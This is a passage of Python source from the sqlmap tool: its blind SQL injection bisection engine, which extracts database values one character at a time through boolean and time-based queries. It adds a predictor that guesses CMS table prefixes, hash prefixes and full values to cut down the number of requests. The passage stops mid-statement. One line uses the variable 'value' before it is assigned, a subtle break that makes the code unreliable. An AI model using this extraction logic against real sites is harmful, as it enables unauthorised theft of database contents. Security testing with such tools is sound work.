#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from __future__ import division

import re
import time

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeDbmsHexValue
from lib.core.common import decodeIntToUnicode
from lib.core.common import filterControlChars
from lib.core.common import getCharset
from lib.core.common import getCounter
from lib.core.common import getPartRun
from lib.core.common import getTechnique
from lib.core.common import getTechniqueData
from lib.core.common import goGoodSamaritan
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import isDigit
from lib.core.common import isListLike
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import ADJUST_TIME_DELAY
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapThreadException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.settings import CHAR_INFERENCE_MARK
from lib.core.settings import INFERENCE_BLANK_BREAK
from lib.core.settings import INFERENCE_EQUALS_CHAR
from lib.core.settings import INFERENCE_GREATER_CHAR
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import INFERENCE_NOT_EQUALS_CHAR
from lib.core.settings import INFERENCE_UNKNOWN_CHAR
from lib.core.settings import MAX_BISECTION_LENGTH
from lib.core.settings import MAX_REVALIDATION_STEPS
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_HEX_VALUE_MARKER
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import PAYLOAD_DELIMITER
from lib.core.settings import RANDOM_INTEGER_MARKER
from lib.core.settings import VALID_TIME_CHARS_RUN_THRESHOLD
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar
from lib.utils.safe2bin import safecharencode
from lib.utils.xrange import xrange
from thirdparty import six

def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    """
    Bisection algorithm that can be used to perform blind SQL injection
    on an affected host
    """

    abortedFlag = False
    showEta = False
    partialValue = u""
    finalValue = None
    retrievedLength = 0

    if payload is None:
        return 0, None

    # Restore predictor learned values from session on first call
    if kb.get("predictor") and not kb.predictor._initialized and not conf.get("noPredict"):
        kb.predictor.initialize()

        try:
            from lib.core.enums import HASHDB_KEYS
            savedLearned = hashDBRetrieve(HASHDB_KEYS.KB_PREDICTOR_LEARNED)
            if savedLearned:
                kb.predictor.restore_learned(savedLearned)
        except Exception:
            pass

    if charsetType is None and conf.charset:
        asciiTbl = sorted(set(ord(_) for _ in conf.charset))
    else:
        asciiTbl = getCharset(charsetType)

    # ─── Nostradamus: Charset restriction for known column types ───
    # If predictor has a charset restriction for the current column (hash, IP),
    # replace the full ASCII table with the restricted one.
    # This reduces queries per character from ~7 to ~4-5 (log2 of smaller charset).
    _nostradamusRestrictedCharset = False
    if (kb.get("predictor") and not conf.get("noPredict")
            and kb.predictor._initialized
            and kb.predictor._current_column_context
            and charsetType is None and not conf.charset):
        restrictedCharset = kb.predictor.get_column_charset_restriction(kb.predictor._current_column_context)
        if restrictedCharset:
            asciiTbl = restrictedCharset
            _nostradamusRestrictedCharset = True
            debugMsg = "predictor: restricted charset to %d chars for column '%s'" % (
                len(restrictedCharset), kb.predictor._current_column_context)
            logger.debug(debugMsg)

    threadData = getCurrentThreadData()
    timeBasedCompare = (getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal:
        if conf.repair and INFERENCE_UNKNOWN_CHAR in retVal:
            pass
        elif PARTIAL_HEX_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_HEX_VALUE_MARKER, "")

            if retVal and conf.hexConvert:
                partialValue = retVal
                infoMsg = "resuming partial value: %s" % safecharencode(partialValue)
                logger.info(infoMsg)
        elif PARTIAL_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")

            if retVal and not conf.hexConvert:
                partialValue = retVal
                infoMsg = "resuming partial value: %s" % safecharencode(partialValue)
                logger.info(infoMsg)
        else:
            infoMsg = "resumed: %s" % safecharencode(retVal)
            logger.info(infoMsg)

            return 0, retVal

    if Backend.isDbms(DBMS.MCKOI):
        match = re.search(r"\ASELECT\b(.+)\bFROM\b(.+)\Z", expression, re.I)
        if match:
            original = queries[Backend.getIdentifiedDbms()].inference.query
            right = original.split('<')[1]
            payload = payload.replace(right, "(SELECT %s FROM %s)" % (right, match.group(2).strip()))
            expression = match.group(1).strip()

    elif Backend.isDbms(DBMS.FRONTBASE):
        match = re.search(r"\ASELECT\b(\s+TOP\s*\([^)]+\)\s+)?(.+)\bFROM\b(.+)\Z", expression, re.I)
        if match:
            payload = payload.replace(INFERENCE_GREATER_CHAR, " FROM %s)%s" % (match.group(3).strip(), INFERENCE_GREATER_CHAR))
            payload = payload.replace("SUBSTRING", "(SELECT%sSUBSTRING" % (match.group(1) if match.group(1) else " "), 1)
            expression = match.group(2).strip()

    try:
        # Set kb.partRun in case "common prediction" feature (a.k.a. "good samaritan") is used or the engine is called from the API
        if conf.predictOutput:
            kb.partRun = getPartRun()
        elif conf.api:
            kb.partRun = getPartRun(alias=False)
        else:
            kb.partRun = None

        if partialValue:
            firstChar = len(partialValue)
        elif re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
            firstChar = 0
        elif conf.firstChar is not None and (isinstance(conf.firstChar, int) or (hasattr(conf.firstChar, "isdigit") and conf.firstChar.isdigit())):
            firstChar = int(conf.firstChar) - 1
            if kb.fileReadMode:
                firstChar <<= 1
        elif hasattr(firstChar, "isdigit") and firstChar.isdigit() or isinstance(firstChar, int):
            firstChar = int(firstChar) - 1
        else:
            firstChar = 0

        if re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
            lastChar = 0
        elif conf.lastChar is not None and (isinstance(conf.lastChar, int) or (hasattr(conf.lastChar, "isdigit") and conf.lastChar.isdigit())):
            lastChar = int(conf.lastChar)
        elif hasattr(lastChar, "isdigit") and lastChar.isdigit() or isinstance(lastChar, int):
            lastChar = int(lastChar)
        else:
            lastChar = 0

        if Backend.getDbms():
            _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
            nulledCastedField = agent.nullAndCastField(fieldToCastStr)
            expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
            expressionUnescaped = unescaper.escape(expressionReplaced)
        else:
            expressionUnescaped = unescaper.escape(expression)

        # ─── Nostradamus: Prefix skip ───
        # If the predictor has learned a common prefix (e.g., "erp_", "wp_", "tbl"),
        # verify it with a single equality query on the first N characters.
        # This saves N characters × 8 queries each.
        if (firstChar == 0 and not partialValue
                and kb.get("predictor") and not conf.get("noPredict")
                and kb.predictor._initialized
                and not re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression)
                and not kb.fileReadMode):

            predictor = kb.predictor
            # Get the most common learned prefix (highest count)
            learned_prefixes = predictor._patterns.get("prefixes", {})
            if learned_prefixes:
                # Sort by frequency, take the most common
                best_prefix = max(learned_prefixes.items(), key=lambda x: x[1])
                prefix_str, prefix_count = best_prefix

                # Only try if we've seen this prefix at least twice
                if prefix_count >= 2 and len(prefix_str) >= 2:
                    # Use MID(expression,1,N)='prefix' for maximum DBMS compatibility
                    prefixLen = len(prefix_str)
                    testValue = unescaper.escape("'%s'" % prefix_str) if "'" not in prefix_str else unescaper.escape("%s" % prefix_str, quote=False)

                    query = getTechniqueData().vector
                    query = agent.prefixQuery(query.replace(INFERENCE_MARKER,
                        "MID((%s),1,%d)%s%s" % (expressionUnescaped, prefixLen, INFERENCE_EQUALS_CHAR, testValue)))
                    query = agent.suffixQuery(query)

                    result = Request.queryPage(agent.payload(newValue=query),
                                               timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(getTechnique())

                    if result:
                        partialValue = prefix_str
                        firstChar = len(prefix_str)

                        # Track prefix skip stats
                        predictor.stats_prefix_skips += 1
                        predictor.stats_prefix_chars_saved += len(prefix_str)

                        infoMsg = "predictor prefix skip: verified '%s' (%d chars skipped)" % (
                            prefix_str, len(prefix_str))
                        logger.info(infoMsg)

            # ─── Nostradamus: Hash prefix skip ───
            # If hash type was auto-detected from previous value, verify the
            # fixed hash prefix (e.g., '$P$', '$2y$10$') with a single MID() query.
            if firstChar == 0 and not partialValue and predictor._auto_detected_hash_prefix:
                hash_prefix = predictor._auto_detected_hash_prefix
                prefixLen = len(hash_prefix)
                testValue = unescaper.escape("'%s'" % hash_prefix) if "'" not in hash_prefix else unescaper.escape("%s" % hash_prefix, quote=False)

                query = getTechniqueData().vector
                query = agent.prefixQuery(query.replace(INFERENCE_MARKER,
                    "MID((%s),1,%d)%s%s" % (expressionUnescaped, prefixLen, INFERENCE_EQUALS_CHAR, testValue)))
                query = agent.suffixQuery(query)

                result = Request.queryPage(agent.payload(newValue=query),
                                           timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(getTechnique())

                if result:
                    partialValue = hash_prefix
                    firstChar = len(hash_prefix)

                    predictor.stats_prefix_skips += 1
                    predictor.stats_prefix_chars_saved += len(hash_prefix)

                    infoMsg = "hash prefix skip: verified '%s' (%d chars skipped)" % (
                        hash_prefix, len(hash_prefix))
                    logger.info(infoMsg)

        if isinstance(length, six.string_types) and isDigit(length) or isinstance(length, int):
            length = int(length)
        else:
            length = None

        if length == 0:
            return 0, ""

        if length and (lastChar > 0 or firstChar > 0):
            length = min(length, lastChar or length) - firstChar

        if length and length > MAX_BISECTION_LENGTH:
            length = None

        showEta = conf.eta and isinstance(length, int)

        if kb.bruteMode:
            numThreads = 1
        else:
            numThreads = min(conf.threads or 0, length or 0) or 1

        if showEta:
            progress = ProgressBar(maxValue=length)

        if numThreads > 1:
            if not timeBasedCompare or kb.forceThreads:
                debugMsg = "starting %d thread%s" % (numThreads, ("s" if numThreads > 1 else ""))
                logger.debug(debugMsg)
            else:
                numThreads = 1

        if conf.threads == 1 and not any((timeBasedCompare, conf.predictOutput)):
            warnMsg = "running in a single-thread mode. Please consider "
            warnMsg += "usage of option '--threads' for faster data retrieval"
            singleTimeWarnMessage(warnMsg)

        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
            if isinstance(length, int) and numThreads > 1:
                dataToStdout("[%s] [INFO] retrieved: %s" % (time.strftime("%X"), "_" * min(length, conf.progressWidth)))
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
            else:
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))

        def tryHint(idx):
            with kb.locks.hint:
                hintValue = kb.hintValue

            if payload is not None and len(hintValue or "") > 0 and len(hintValue) >= idx:
                if "'%s'" % CHAR_INFERENCE_MARK in payload:
                    posValue = hintValue[idx - 1]
                else:
                    posValue = ord(hintValue[idx - 1])

                markingValue = "'%s'" % CHAR_INFERENCE_MARK
                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
                forgedPayload = agent.extractPayload(payload) or ""
                forgedPayload = forgedPayload.replace(markingValue, unescapedCharValue)
                forgedPayload = safeStringFormat(forgedPayload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue))
                result = Request.queryPage(agent.replacePayload(payload, forgedPayload), timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(getTechnique())

                if result:
                    return hintValue[idx - 1]

            with kb.locks.hint:
                kb.hintValue = ""

            return None

        def validateChar(idx, value):
            """
            Used in inference - in time-based SQLi if original and retrieved value are not equal there will be a deliberate delay
            """

            threadData = getCurrentThreadData()

            validationPayload = re.sub(r"(%s.*?)%s(.*?%s)" % (PAYLOAD_DELIMITER, INFERENCE_GREATER_CHAR, PAYLOAD_DELIMITER), r"\g<1>%s\g<2>" % INFERENCE_NOT_EQUALS_CHAR, payload)

            if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx, value))
            else:
                # e.g.: ... > '%c' -> ... > ORD(..)
                markingValue = "'%s'" % CHAR_INFERENCE_MARK
                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(value))
                forgedPayload = validationPayload.replace(markingValue, unescapedCharValue)
                forgedPayload = safeStringFormat(forgedPayload, (expressionUnescaped, idx))

            result = not Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)

            if result and timeBasedCompare and getTechniqueData().trueCode:
                result = threadData.lastCode == getTechniqueData().trueCode
                if not result:
                    warnMsg = "detected HTTP code '%s' in validation phase is differing from expected '%s'" % (threadData.lastCode, getTechniqueData().trueCode)
                    singleTimeWarnMessage(warnMsg)

            incrementCounter(getTechnique())

            return result

        def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None, retried=None):
            """
            continuousOrder means that distance between each two neighbour's
            numerical values is exactly 1
            """

            threadData = getCurrentThreadData()

            result = tryHint(idx)

            if result:
                return result

            if charTbl is None:
                charTbl = type(asciiTbl)(asciiTbl)

            originalTbl = type(charTbl)(charTbl)

            if kb.disableShiftTable:
                shiftTable = None
            elif continuousOrder and shiftTable is None:
                # Used for gradual expanding into unicode charspace
                shiftTable = [2, 2, 3, 3, 3]

            if "'%s'" % CHAR_INFERENCE_MARK in payload:
                for char in ('\n', '\r'):
                    if ord(char) in charTbl:
                        if not isinstance(charTbl, list):
                            charTbl = list(charTbl)
                        charTbl.remove(ord(char))

            if not charTbl:
                return None

            elif len(charTbl) == 1:
                forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))
                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(getTechnique())

                if result:
                    return decodeIntToUnicode(charTbl[0])
                else:
                    return None

            maxChar = maxValue = charTbl[-1]
            minValue = charTbl[0]
            firstCheck = False
            lastCheck = False
            unexpectedCode = False

            if continuousOrder:
                while len(charTbl) > 1:
                    position = None

                    if charsetType is None:
                        if not firstCheck:
                            try:
                                try:
                                    lastChar = [_ for _ in threadData.shared.value if _ is not None][-1]
                                except IndexError:
                                    lastChar = None
                                else:
                                    if 'a' <= lastChar <= 'z':
                                        position = charTbl.index(ord('a') - 1)  # 96
                                    elif 'A' <= lastChar <= 'Z':
                                        position = charTbl.index(ord('A') - 1)  # 64
                                    elif '0' <= lastChar <= '9':
                                        position = charTbl.index(ord('0') - 1)  # 47
                            except ValueError:
                                pass
                            finally:
                                firstCheck = True

                        elif not lastCheck and numThreads == 1:  # not usable in multi-threading environment
                            if charTbl[(len(charTbl) >> 1)] < ord(' '):
                                try:
                                    # favorize last char check if current value inclines toward 0
                                    position = charTbl.index(1)
                                except ValueError:
                                    pass
                                finally:
                                    lastCheck = True

                    if position is None:
                        position = (len(charTbl) >> 1)

                    posValue = charTbl[position]
                    falsePayload = None

                    if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                        forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))
                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx, RANDOM_INTEGER_MARKER))
                    else:
                        # e.g.: ... > '%c' -> ... > ORD(..)
                        markingValue = "'%s'" % CHAR_INFERENCE_MARK
                        unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
                        forgedPayload = payload.replace(markingValue, unescapedCharValue)
                        forgedPayload = safeStringFormat(forgedPayload, (expressionUnescaped, idx))
                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, NULL)

                    if timeBasedCompare:
                        if kb.responseTimeMode:
                            kb.responseTimePayload = falsePayload
                        else:
                            kb.responseTimePayload = None

                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)

                    incrementCounter(getTechnique())

                    if not timeBasedCompare and getTechniqueData() is not None:
                        unexpectedCode |= threadData.lastCode not in (getTechniqueData().falseCode, getTechniqueData().trueCode)
                        if unexpectedCode:
                            if threadData.lastCode is not None:
                                warnMsg = "unexpected HTTP code '%s' detected." % threadData.lastCode
                            else:
                                warnMsg = "unexpected response detected."

                            warnMsg += " Will use (extra) validation step in similar cases"

                            singleTimeWarnMessage(warnMsg)

                    if result:
                        minValue = posValue

                        if not isinstance(charTbl, xrange):
                            charTbl = charTbl[position:]
                        else:
                            # xrange() - extended virtual charset used for memory/space optimization
                            charTbl = xrange(charTbl[position], charTbl[-1] + 1)
                    else:
                        maxValue = posValue

                        if not isinstance(charTbl, xrange):
                            charTbl = charTbl[:position]
                        else:
                            charTbl = xrange(charTbl[0], charTbl[position])

                    if len(charTbl) == 1:
                        if maxValue == 1:
                            return None

                        # Going beyond the original charset
                        elif minValue == maxChar:
                            # If the original charTbl was [0,..,127] new one
                            # will be [128,..,(128 << 4) - 1] or from 128 to 2047
                            # and instead of making a HUGE list with all the
                            # elements we use a xrange, which is a virtual
                            # list
                            if expand and shiftTable:
                                charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())
                                originalTbl = xrange(charTbl[0], charTbl[-1] + 1)
                                maxChar = maxValue = charTbl[-1]
                                minValue = charTbl[0]
                            else:
                                kb.disableShiftTable = True
                                return None
                        else:
                            retVal = minValue + 1

                            if retVal in originalTbl or (retVal == ord('\n') and CHAR_INFERENCE_MARK in payload):
                                if (timeBasedCompare or unexpectedCode) and not validateChar(idx, retVal):
                                    if not kb.originalTimeDelay:
                                        kb.originalTimeDelay = conf.timeSec

                                    threadData.validationRun = 0
                                    if (retried or 0) < MAX_REVALIDATION_STEPS:
                                        errMsg = "invalid character detected. retrying.."
                                        logger.error(errMsg)

                                        if timeBasedCompare:
                                            if kb.adjustTimeDelay is not ADJUST_TIME_DELAY.DISABLE:
                                                conf.timeSec += 1
                                                warnMsg = "increasing time delay to %d second%s" % (conf.timeSec, 's' if conf.timeSec > 1 else '')
                                                logger.warning(warnMsg)

                                            if kb.adjustTimeDelay is ADJUST_TIME_DELAY.YES:
                                                dbgMsg = "turning off time auto-adjustment mechanism"
                                                logger.debug(dbgMsg)
                                                kb.adjustTimeDelay = ADJUST_TIME_DELAY.NO

                                        return getChar(idx, originalTbl, continuousOrder, expand, shiftTable, (retried or 0) + 1)
                                    else:
                                        errMsg = "unable to properly validate last character value ('%s').." % decodeIntToUnicode(retVal)
                                        logger.error(errMsg)
                                        conf.timeSec = kb.originalTimeDelay
                                        return decodeIntToUnicode(retVal)
                                else:
                                    if timeBasedCompare:
                                        threadData.validationRun += 1
                                        if kb.adjustTimeDelay is ADJUST_TIME_DELAY.NO and threadData.validationRun > VALID_TIME_CHARS_RUN_THRESHOLD:
                                            dbgMsg = "turning back on time auto-adjustment mechanism"
                                            logger.debug(dbgMsg)
                                            kb.adjustTimeDelay = ADJUST_TIME_DELAY.YES

                                    return decodeIntToUnicode(retVal)
                            else:
                                return None
            else:
                if "'%s'" % CHAR_INFERENCE_MARK in payload and conf.charset:
                    errMsg = "option '--charset' is not supported on '%s'" % Backend.getIdentifiedDbms()
                    raise SqlmapUnsupportedFeatureException(errMsg)

                candidates = list(originalTbl)
                bit = 0
                while len(candidates) > 1:
                    bits = {}
                    maxCandidate = max(candidates)
                    maxBits = maxCandidate.bit_length() if maxCandidate > 0 else 1

                    for candidate in candidates:
                        for bit in xrange(maxBits):
                            bits.setdefault(bit, 0)
                            if candidate & (1 << bit):
                                bits[bit] += 1
                            else:
                                bits[bit] -= 1

                    choice = sorted(bits.items(), key=lambda _: abs(_[1]))[0][0]
                    mask = 1 << choice

                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, "&%d%s" % (mask, INFERENCE_GREATER_CHAR)), (expressionUnescaped, idx, 0))
                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(getTechnique())

                    if result:
                        candidates = [_ for _ in candidates if _ & mask > 0]
                    else:
                        candidates = [_ for _ in candidates if _ & mask == 0]

                    bit += 1

                if candidates:
                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, candidates[0]))
                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(getTechnique())

                    if result:
                        if candidates[0] == 0:      # Trailing zeros
                            return None
                        else:
                            return decodeIntToUnicode(candidates[0])

        # ─── Nostradamus: Pre-extraction full value prediction ───
        # If we know the length and the predictor has a high-confidence candidate,
        # try to verify the full value with a single equality query BEFORE
        # starting the character-by-character extraction.
        if (kb.get("predictor") and not conf.get("noPredict")
                and isinstance(length, int) and length > 3
                and not partialValue and not kb.fileReadMode
                and firstChar == 0):
            predictor = kb.predictor
            if predictor._initialized:
                # Check if predictor is not auto-disabled
                totalAttempts = predictor.stats_hits + predictor.stats_misses
                hitRate = (predictor.stats_hits / totalAttempts) if totalAttempts > 0 else 1.0

                if not (totalAttempts >= 20 and hitRate < 0.05):
                    # Collect candidates to try:
                    # 1. From quick schema tables (CMS-specific, exact length match)
                    # 2. From trie predictions with known prefixes
                    candidatesToTry = []

                    # Source 1: Quick schema tables matching this length
                    if predictor._detected_cms:
                        for table in predictor.get_quick_schema_tables():
                            if len(table) == length and table not in candidatesToTry:
                                candidatesToTry.append(table)

                    # Source 2: Trie predictions with CMS prefix
                    if predictor._detected_cms and not candidatesToTry:
                        cms_prefixes = {
                            "wordpress": ["wp_"], "joomla": ["jos_"], "drupal": [],
                            "magento": [], "prestashop": ["ps_"], "moodle": ["mdl_"],
                            "django": ["auth_", "django_"], "phpbb": ["phpbb_"],
                            "nextcloud": ["oc_"], "vtiger": ["vtiger_"],
                            "dolibarr": ["llx_"], "glpi": ["glpi_"], "mantis": ["mantis_"],
                        }
                        for prefix in cms_prefixes.get(predictor._detected_cms, []):
                            for cand, weight in predictor.predict(prefix, length_filter=length, max_results=10):
                                if weight >= predictor.WEIGHT_STATIC_DICT and cand not in candidatesToTry:
                                    candidatesToTry.append(cand)

                    # When CMS is detected, try more candidates since misses are cheap (~0.3s each)
                    # For boolean-based blind, each miss costs ~0.01s, so trying 10 is negligible
                    maxPreTries = 10 if predictor._detected_cms else 3

                    for bestCandidate in candidatesToTry[:maxPreTries]:
                        testValue = unescaper.escape("'%s'" % bestCandidate) if "'" not in bestCandidate else unescaper.escape("%s" % bestCandidate, quote=False)
                        query = getTechniqueData().vector
                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)%s%s" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, testValue)))
                        query = agent.suffixQuery(query)
                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(getTechnique())

                        queryDuration = threadData.lastQueryDuration if hasattr(threadData, 'lastQueryDuration') else None

                        if result:
                            predictor.record_hit(bestCandidate, 0, queryDuration)
                            predictor.learn(bestCandidate)

                            infoMsg = "predictor pre-check hit: '%s' (skipped full extraction)" % bestCandidate
                            logger.info(infoMsg)

                            if conf.verbose in (1, 2) or conf.api:
                                dataToStdout(filterControlChars(bestCandidate))

                            finalValue = bestCandidate
                            if showEta:
                                progress.progress(length)

                            hashDBWrite(expression, "%s%s%s" % (value, finalValue, PARTIAL_VALUE_MARKER if len(finalValue) < length else ""), check=False)
                            return 0, finalValue
                        else:
                            predictor.record_miss(queryDuration)

        # Go multi-threading (--threads > 1)
        if numThreads > 1 and isinstance(length, int) and length > 1:
            threadData.shared.value = [None] * length
            threadData.shared.index = [firstChar]    # As list for python nested function scoping
            threadData.shared.start = firstChar

            try:
                def blindThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        with kb.locks.index:
                            if threadData.shared.index[0] - firstChar >= length:
                                return

                            threadData.shared.index[0] += 1
                            currentCharIndex = threadData.shared.index[0]

                        if kb.threadContinue:
                            # Use predictor charset hints if available (thread-safe)
                            if kb.get("predictor") and not kb.fileReadMode and not conf.get("noPredict"):
                                with kb.locks.value:
                                    currentPartial = "".join(_ for _ in threadData.shared.value if _ is not None)

                                if len(currentPartial) >= 2:
                                    charsetHint = kb.predictor.get_charset_hint(currentPartial)
                                    if charsetHint:
                                        hintSet = set(charsetHint)
                                        prioritizedCharset = charsetHint + [c for c in asciiTbl if c not in hintSet]
                                        val = getChar(currentCharIndex, prioritizedCharset, False)
                                    else:
                                        val = getChar(currentCharIndex, asciiTbl, not (charsetType is None and conf.charset))
                                else:
                                    val = getChar(currentCharIndex, asciiTbl, not (charsetType is None and conf.charset))
                            else:
                                val = getChar(currentCharIndex, asciiTbl, not (charsetType is None and conf.charset))

                            if val is None:
                                val = INFERENCE_UNKNOWN_CHAR
                        else:
                            break

                        # NOTE: https://github.com/sqlmapproject/sqlmap/issues/4629
                        if not isListLike(threadData.shared.value):
                            break

                        with kb.locks.value:
                            threadData.shared.value[currentCharIndex - 1 - firstChar] = val
                            currentValue = list(threadData.shared.value)

                        if kb.threadContinue:
                            if showEta:
                                progress.progress(threadData.shared.index[0])
                            elif conf.verbose >= 1:
                                startCharIndex = 0
                                endCharIndex = 0

                                for i in xrange(length):
                                    if currentValue[i] is not None:
                                        endCharIndex = max(endCharIndex, i)

                                output = ''

                                if endCharIndex > conf.progressWidth:
                                    startCharIndex = endCharIndex - conf.progressWidth

                                count = threadData.shared.start

                                for i in xrange(startCharIndex, endCharIndex + 1):
                                    output += '_' if currentValue[i] is None else filterControlChars(currentValue[i] if len(currentValue[i]) == 1 else ' ', replacement=' ')

                                for i in xrange(length):
                                    count += 1 if currentValue[i] is not None else 0

                                if startCharIndex > 0:
                                    output = ".." + output[2:]

                                if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length - 1):
                                    output = output[:-2] + ".."

                                if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
                                    _ = count - firstChar
                                    output += '_' * (min(length, conf.progressWidth) - len(output))
                                    status = ' %d/%d (%d%%)' % (_, length, int(100.0 * _ / length))
                                    output += status if _ != length else " " * len(status)

                                    dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), output))

                runThreads(numThreads, blindThread, startThreadMsg=False)

            except KeyboardInterrupt:
                abortedFlag = True

            finally:
                value = [_ for _ in partialValue]
                value.extend(_ for _ in threadData.shared.value)

            infoMsg = None

            # If we have got one single character not correctly fetched it
            # can mean that the connection to the target URL was lost
            if None in value:
                partialValue = "".join(value[:value.index(None)])

                if partialValue:
                    infoMsg = "\r[%s] [INFO] partially retrieved: %s" % (time.strftime("%X"), filterControlChars(partialValue))
            else:
                finalValue = "".join(value)
                infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), filterControlChars(finalValue))

            if conf.verbose in (1, 2) and infoMsg and not any((showEta, conf.api, kb.bruteMode)):
                dataToStdout(infoMsg)

        # No multi-threading (--threads = 1)
        else:
            index = firstChar
            threadData.shared.value = ""
            predictorLastTriedCandidate = None  # track which candidate we already tried
            predictorAttemptsThisValue = 0      # cap attempts per value
            # More attempts when CMS detected (high confidence), fewer without CMS
            PREDICTOR_MAX_ATTEMPTS_PER_VALUE = 5 if (kb.get("predictor") and kb.predictor._detected_cms) else 3

            while True:
                index += 1
                predictorHandled = False

                # Schema predictor feature
                # Rules to minimize wasted queries:
                # 1. Max attempts per value (3 without CMS, 5 with CMS)
                # 2. Only retry if the top candidate CHANGED (more chars = better candidate)
                # 3. Auto-disable if hit rate < 10% after 20+ attempts across all values
                # 4. Charset hints are always FREE (no extra queries)
                # 5. Only attempt equality checks for high-confidence candidates (CMS or learned)
                if kb.get("predictor") and len(partialValue) > 0 and not kb.fileReadMode and not conf.get("noPredict"):
                    val = None
                    predictor = kb.predictor

                    # Auto-disable: stop equality checks if hit rate is too low
                    totalAttempts = predictor.stats_hits + predictor.stats_misses
                    hitRate = (predictor.stats_hits / totalAttempts) if totalAttempts > 0 else 1.0
                    if totalAttempts >= 20 and hitRate < 0.05:
                        # Less than 5% hit rate after 20+ attempts - skip equality checks
                        pass
                    elif predictorAttemptsThisValue < PREDICTOR_MAX_ATTEMPTS_PER_VALUE and len(partialValue) >= 3:
                        candidates = predictor.predict(partialValue, length_filter=length, max_results=5)

                        if candidates:
                            bestCandidate, bestWeight = candidates[0]

                            # Only attempt equality checks for HIGH confidence candidates:
                            # - WEIGHT_CMS_DETECTED (90): CMS tables verified by fingerprint
                            # - WEIGHT_SCHEMA_LEARNING (100): values seen in current session
                            # Pattern-derived (80) and static dict (40) are NOT worth the
                            # cost of a failed equality check in time-based blind (~5s each)
                            minWeight = predictor.WEIGHT_CMS_DETECTED  # 90

                            # Smart trigger: wait for more chars if confidence is lower
                            minCharsForWeight = 3 if bestWeight >= minWeight else 4

                            # Only attempt if:
                            # - Weight is high enough (CMS detected or learned)
                            # - We have enough chars for this weight level
                            # - The candidate is DIFFERENT from what we already tried
                            if (bestWeight >= minWeight
                                    and len(partialValue) >= minCharsForWeight
                                    and bestCandidate != predictorLastTriedCandidate):

                                predictorLastTriedCandidate = bestCandidate
                                predictorAttemptsThisValue += 1

                                testValue = unescaper.escape("'%s'" % bestCandidate) if "'" not in bestCandidate else unescaper.escape("%s" % bestCandidate, quote=False)

                                query = getTechniqueData().vector
                                query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)%s%s" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, testValue)))
